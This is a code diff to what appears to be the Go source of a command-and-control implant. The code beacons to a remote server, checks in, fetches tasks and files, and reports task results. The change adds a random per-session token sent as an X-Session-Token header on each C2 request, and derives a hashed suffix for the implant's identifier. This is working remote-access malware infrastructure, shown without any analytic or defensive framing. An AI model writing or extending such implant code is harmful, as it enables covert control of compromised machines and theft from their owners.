@@ -28,6 +28,7 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
@@ -72,6 +73,7 @@ const tcpBeaconWireMax = 64 << 20
 var (
 	implantUUID  string
 	sessionID    string
+	sessionToken string
 	currentSleep = defaultSleep
 	currentJit   = defaultJitter
 	cwdMu        sync.Mutex
@@ -114,6 +116,16 @@ type TaskReport struct {
 func main() {
 	defer func() { _ = recover() }()
 	implantUUID = generateImplantUUID()
+	if beaconTransport != "tcp" {
+		tokenBytes := make([]byte, 32)
+		if _, err := rand.Read(tokenBytes); err != nil {
+			return
+		}
+		sessionToken = base64.RawURLEncoding.EncodeToString(tokenBytes)
+		// Persist only a derived identity, never a prefix of the session credential.
+		identityHash := sha256.Sum256(tokenBytes)
+		implantUUID += "-" + base64.RawURLEncoding.EncodeToString(identityHash[:12])
+	}
 	currentCwd, _ = os.Getwd()
 
 	if beaconTransport == "tcp" {
@@ -366,6 +378,7 @@ func fetchC2FileByID(fileID string) ([]byte, error) {
 	req, _ := http.NewRequest("GET", url, nil)
 	req.Header.Set("User-Agent", userAgent)
 	req.Header.Set("X-Implant-Token", implantToken)
+	req.Header.Set("X-Session-Token", sessionToken)
 	resp, err := httpClient.Do(req)
 	if err != nil {
 		return nil, err
@@ -509,6 +522,7 @@ func checkIn() (*CheckInResp, error) {
 	req, _ := http.NewRequest("POST", serverURL+checkInPath, bytes.NewReader([]byte(enc)))
 	req.Header.Set("User-Agent", userAgent)
 	req.Header.Set("X-Implant-Token", implantToken)
+	req.Header.Set("X-Session-Token", sessionToken)
 	resp, err := httpClient.Do(req)
 	if err != nil {
 		return nil, err
@@ -537,6 +551,7 @@ func fetchTasks() ([]TaskEnv, error) {
 	req, _ := http.NewRequest("GET", url, nil)
 	req.Header.Set("User-Agent", userAgent)
 	req.Header.Set("X-Implant-Token", implantToken)
+	req.Header.Set("X-Session-Token", sessionToken)
 	resp, err := httpClient.Do(req)
 	if err != nil {
 		return nil, err
@@ -571,6 +586,7 @@ func reportResult(report TaskReport) {
 	req, _ := http.NewRequest("POST", serverURL+resultPath, bytes.NewReader([]byte(enc)))
 	req.Header.Set("User-Agent", userAgent)
 	req.Header.Set("X-Implant-Token", implantToken)
+	req.Header.Set("X-Session-Token", sessionToken)
 	resp, err := httpClient.Do(req)
 	if err != nil {
 		return
